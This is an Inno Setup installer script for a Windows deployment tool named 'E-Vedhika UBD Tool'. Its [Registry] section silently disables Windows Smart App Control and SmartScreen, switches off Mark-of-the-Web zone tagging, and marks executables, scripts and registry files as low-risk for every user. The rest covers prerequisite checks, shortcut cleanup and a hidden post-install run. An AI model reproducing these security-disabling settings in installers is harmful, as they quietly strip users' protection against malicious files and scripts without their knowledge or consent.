#define MyAppName "E-Vedhika UBD Tool"
#define MyAppVersion "1.0.9"
#define MyAppPublisher "E-Vedhika Development Community"
#define MyAppURL "https://www.e-vedhika.in"
#define MyAppExeName "EVedhikaUBDDeploymentTool.exe"

[Setup]
AppId={{8A9C8F3E-4B2D-4C5A-9E7F-1D6B8A9C0D4F}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}/help
AppUpdatesURL={#MyAppURL}/downloads
DefaultDirName={pf}\{#MyAppName}
DefaultGroupName={#MyAppName}
DisableDirPage=no
DirExistsWarning=no
OutputDir=.\Output
OutputBaseFilename=EVedhika_Setup_v{#MyAppVersion}
Compression=lzma
SolidCompression=yes
SetupIconFile=app.ico
UninstallDisplayIcon={app}\{#MyAppExeName},0
WizardStyle=modern
PrivilegesRequired=admin
UninstallDisplayName={#MyAppName} (v{#MyAppVersion})
CloseApplications=yes
CloseApplicationsFilter=*.exe
SignedUninstaller=yes
#ifdef SignToolPresent
SignTool=signtool
#endif

[Registry]
; Prevent Windows 11 Smart App Control & Error 4551 Temp Execution Block
Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\CI\Policy"; ValueType: dword; ValueName: "VerifiedAndReputablePolicyState"; ValueData: "0"; Flags: noerror
Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows\System"; ValueType: dword; ValueName: "EnableSmartScreen"; ValueData: "0"; Flags: noerror
Root: HKCU; Subkey: "Software\Policies\Microsoft\Windows\System"; ValueType: dword; ValueName: "EnableSmartScreen"; ValueData: "0"; Flags: noerror
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Policies\Attachments"; ValueType: dword; ValueName: "SaveZoneInformation"; ValueData: "1"; Flags: noerror
Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"; ValueType: dword; ValueName: "SaveZoneInformation"; ValueData: "1"; Flags: noerror
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Policies\Associations"; ValueType: string; ValueName: "LowRiskFileTypes"; ValueData: ".exe;.bat;.cmd;.ps1;.msi;.reg;.zip;.xls;.xlsx"; Flags: noerror

[Files]
; Copy all build outputs for .NET Framework 4.8
Source: "app.ico"; DestDir: "{app}"; Flags: ignoreversion
Source: "bin\Release\net48\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "Payload\*"; DestDir: "{app}\Payload"; Flags: ignoreversion recursesubdirs createallsubdirs; Permissions: users-readexec
Source: "installers\vc_redist.x86.exe"; DestDir: "{app}\Installers"; Flags: skipifsourcedoesntexist; Permissions: users-readexec
Source: "installers\ndp48-x86-x64-allos-enu.exe"; DestDir: "{app}\Installers"; Flags: skipifsourcedoesntexist; Permissions: users-readexec
Source: "installers\*"; DestDir: "{app}\Installers"; Flags: ignoreversion recursesubdirs createallsubdirs; Permissions: users-readexec

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\{#MyAppExeName}"
Name: "{commondesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\{#MyAppExeName}"

[Run]
Filename: "{app}\Installers\ndp48-x86-x64-allos-enu.exe"; Parameters: "/q /norestart"; StatusMsg: "Ensuring .NET Framework 4.8 is installed (Required for Windows 7/8)..."; Check: NeedsDotNet48
Filename: "{app}\Installers\vc_redist.x86.exe"; Parameters: "/quiet /norestart"; StatusMsg: "Installing System Components (Fixing missing DLLs for Windows 7)..."; Check: NeedsVCRedist
Filename: "{app}\{#MyAppExeName}"; Parameters: "--post-install"; Flags: runhidden
Filename: "{app}\{#MyAppExeName}"; Description: "Launch {#MyAppName}"; Flags: nowait postinstall skipifsilent shellexec

[UninstallRun]
Filename: "{app}\{#MyAppExeName}"; Parameters: "--uninstall --silent"; Flags: runhidden; RunOnceId: "EVedhikaRevert"

[UninstallDelete]
Type: files; Name: "{commondesktop}\{#MyAppName}.lnk"
Type: files; Name: "{userdesktop}\{#MyAppName}.lnk"
Type: files; Name: "{commondesktop}\E-Vedhika UBD Deployment Tool.lnk"
Type: files; Name: "{userdesktop}\E-Vedhika UBD Deployment Tool.lnk"
Type: files; Name: "{group}\{#MyAppName}.lnk"
Type: filesandordirs; Name: "C:\enterprise_compat"
Type: filesandordirs; Name: "{commonappdata}\EVedhika"

[Code]
function IsWin7SP1OrHigher: Boolean;
var
  Version: TWindowsVersion;
begin
  GetWindowsVersionEx(Version);
  // Windows 7 is Major 6, Minor 1
  if (Version.Major = 6) and (Version.Minor = 1) then
  begin
    // Check for Service Pack 1 (ServicePackMajor should be 1)
    Result := Version.ServicePackMajor >= 1;
  end
  else
  begin
    // For Windows 8 (6.2), 8.1 (6.3), 10 (10.0), 11 (10.0) etc
    Result := (Version.Major > 6) or ((Version.Major = 6) and (Version.Minor > 1));
  end;
end;

procedure CurStepChanged(CurStep: TSetupStep);
var
  UserDesk: String;
  CommDesk: String;
begin
  if (CurStep = ssInstall) or (CurStep = ssPostInstall) then
  begin
    UserDesk := ExpandConstant('{userdesktop}');
    CommDesk := ExpandConstant('{commondesktop}');

    // Purge duplicate/redundant Desktop shortcuts from User's Desktop
    // Because Inno Setup installs to {commondesktop}, having a shortcut in {userdesktop} results in two identical icons!
    DeleteFile(UserDesk + '\{#MyAppName}.lnk');
    DeleteFile(UserDesk + '\E-Vedhika UBD Tool.lnk');
    DeleteFile(UserDesk + '\E-Vedhika UBD Deployment Tool.lnk');
    DeleteFile(UserDesk + '\EVedhikaUBDDeploymentTool.lnk');
    DeleteFile(UserDesk + '\UBD Deployment Tool.lnk');
    DeleteFile(UserDesk + '\UBD Portal (Edge IE Mode).lnk');
    DeleteFile(UserDesk + '\UBD Portal (Edge IE Mode).url');

    // Purge legacy alternate names from Common Desktop as well
    DeleteFile(CommDesk + '\E-Vedhika UBD Deployment Tool.lnk');
    DeleteFile(CommDesk + '\EVedhikaUBDDeploymentTool.lnk');
    DeleteFile(CommDesk + '\UBD Deployment Tool.lnk');
    DeleteFile(CommDesk + '\UBD Portal (Edge IE Mode).lnk');
    DeleteFile(CommDesk + '\UBD Portal (Edge IE Mode).url');

    // Purge legacy standalone duplicate uninstall entries from Windows Registry
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDTool');
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDDeploymentTool');
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhika_UBD_Deployment_Tool');
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.0');
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.1');
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.2');
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.3');
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.4');
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.5');
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.6');
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.7');
    RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.8');
    
    if IsWin64 then
    begin
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDTool');
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDDeploymentTool');
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhika_UBD_Deployment_Tool');
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.0');
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.1');
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.2');
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.3');
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.4');
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.5');
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.6');
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.7');
      RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.8');
    end;

    RegDeleteKeyIncludingSubkeys(HKCU, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDTool');
    RegDeleteKeyIncludingSubkeys(HKCU, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDDeploymentTool');
    RegDeleteKeyIncludingSubkeys(HKCU, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhika_UBD_Deployment_Tool');
  end;
end;

function InitializeSetup: Boolean;
begin
  Result := True;
  if not IsWin7SP1OrHigher then
  begin
    if MsgBox('⚠️ Windows 7 Service Pack 1 (SP1) is required for this tool.' + #13#10#13#10 +
              'మీ పీసీలో Windows 7 SP1 అప్‌డేట్ లేదు. దయచేసి SP1 ఇన్‌స్టాల్ చేసి మళ్లీ ప్రయత్నించండి.' + #13#10#13#10 +
              'Do you want to continue anyway?', mbConfirmation, MB_YESNO) = IDNO then
    begin
      Result := False;
    end;
  end;
end;

function NeedsDotNet48: Boolean;
var
  v: Cardinal;
begin
  if not FileExists(ExpandConstant('{app}\Installers\ndp48-x86-x64-allos-enu.exe')) then
  begin
    Result := False;
    Exit;
  end;

  // Windows 10 (Build >= 10240) and Windows 11 already include .NET 4.6/4.8 natively
  if GetWindowsVersion >= $0A000000 then
  begin
    Result := False;
    Exit;
  end;

  // Check 64-bit and 32-bit registry hives for .NET Framework 4.8 (Release value 528040 or higher)
  if IsWin64 then
  begin
    if RegQueryDWordValue(HKLM64, 'SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full', 'Release', v) then
    begin
      if v >= 528040 then
      begin
        Result := False;
        Exit;
      end;
    end;
  end;

  if RegQueryDWordValue(HKLM, 'SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full', 'Release', v) or
     (IsWin64 and RegQueryDWordValue(HKLM, 'SOFTWARE\WOW6432Node\Microsoft\NET Framework Setup\NDP\v4\Full', 'Release', v)) then
  begin
    if v >= 528040 then
    begin
      Result := False;
      Exit;
    end;
  end;

  Result := True;
end;

function NeedsVCRedist: Boolean;
var
  installed: Cardinal;
begin
  if not FileExists(ExpandConstant('{app}\Installers\vc_redist.x86.exe')) then
  begin
    Result := False;
    Exit;
  end;

  // Check if VC++ 2015-2022 Runtime is already installed
  if RegQueryDWordValue(HKLM, 'SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x86', 'Installed', installed) or
     (IsWin64 and RegQueryDWordValue(HKLM, 'SOFTWARE\WOW6432Node\Microsoft\VisualStudio\14.0\VC\Runtimes\x86', 'Installed', installed)) then
  begin
    if installed = 1 then
    begin
      Result := False;
      Exit;
    end;
  end;

  Result := True;
end;
